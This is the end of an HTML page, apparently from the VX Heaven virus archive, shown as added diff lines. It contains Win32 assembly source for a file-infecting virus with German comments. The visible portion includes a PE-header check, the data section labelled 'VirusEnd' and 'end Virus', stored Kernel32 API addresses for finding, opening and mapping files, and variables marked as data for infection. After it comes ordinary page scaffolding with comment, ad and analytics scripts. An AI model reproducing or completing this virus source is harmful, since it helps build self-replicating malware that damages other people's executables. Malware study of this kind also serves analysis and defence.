+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'[M'</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jae</span> NoPESign<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'YM'</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jbe</span> NoPESign<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">clc</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -------------------[ Daten die nicht mitwandern ]--------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+VirusEnd<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Dies hier wird nicht mitwandern...</span><br/>
+<br/>
+&nbsp;K32Handle <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hier speichern wir das Handle der Kernel32.dll </span><br/>
+<br/>
+&nbsp;XLoadLibraryA &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; <span style="color: black; font-style: italic;">; Hier die Offsets der ersten beiden API's</span><br/>
+&nbsp;XGetProcAddress &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Alle anderen API - Adressen</span><br/>
+&nbsp;XFindFirstFileA &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XFindNextFileA &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XFindClose &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XCreateFileA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XCloseHandle &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XCreateFileMappingA &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XMapViewOfFile &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;XUnmapViewOfFile &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Daten für die Kernel-Suche</span><br/>
+&nbsp;KernelAddy &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; PE-Header</span><br/>
+&nbsp;MZAddy &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; MZ-Header</span><br/>
+&nbsp;counter &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wie viele Namen haben wir getestet</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Daten für die Infektion</span><br/>
+&nbsp;ATableVA <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Address Table VA</span><br/>
+&nbsp;NTableVA <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Name Pointer Table VA</span><br/>
+&nbsp;OTableVA <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Name Pointer Table VA</span><br/>
+<br/>
+&nbsp;NewSize &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Neue Größe der Datei</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Daten um Dateien zu finden</span><br/>
+&nbsp;WIN32_FIND_DATA &nbsp; &nbsp; &nbsp; &nbsp; label &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">byte</span><br/>
+&nbsp;WFD_dwFileAttributes &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;WFD_ftCreationTime &nbsp; &nbsp; &nbsp;FILETIME ?<br/>
+&nbsp;WFD_ftLastAccessTime &nbsp; &nbsp;FILETIME ?<br/>
+&nbsp;WFD_ftLastWriteTime &nbsp; &nbsp; FILETIME ?<br/>
+&nbsp;WFD_nFileSizeHigh &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;WFD_nFileSizeLow &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;WFD_dwReserved0 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;WFD_dwReserved1 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;WFD_szFileName &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp; 260d dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;WFD_szAlternateFileName <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">13</span> &nbsp; dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+&nbsp;WFD_szAlternateEnding &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">03</span> &nbsp; dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp;FileHandle &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Handle der Datei</span><br/>
+&nbsp;MapHandle &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Handle der Map</span><br/>
+&nbsp;MapAddress &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Offset der Map</span><br/>
+<br/>
+EndBufferData<span style="color: #339933;">:</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ------------------------[ Das wars für heute ]-----------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+end Virus<br/>
+&nbsp;</div>
+[<a style="" href="/lib/?lang=DE&amp;index=WI#vsn03">zurück zum Index</a>] [<a href="/lib/vsn03.html#disqus_thread">Kommentare</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsn03">de</a><a href="/lib/index.php?lang=en&amp;id=vsn03">en</a><a href="/lib/index.php?lang=es&amp;id=vsn03">es</a><a href="/lib/index.php?lang=it&amp;id=vsn03">it</a><a href="/lib/index.php?lang=fr&amp;id=vsn03">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsn03">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsn03">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsn03">ua</a></div>
+</body>
+</html>
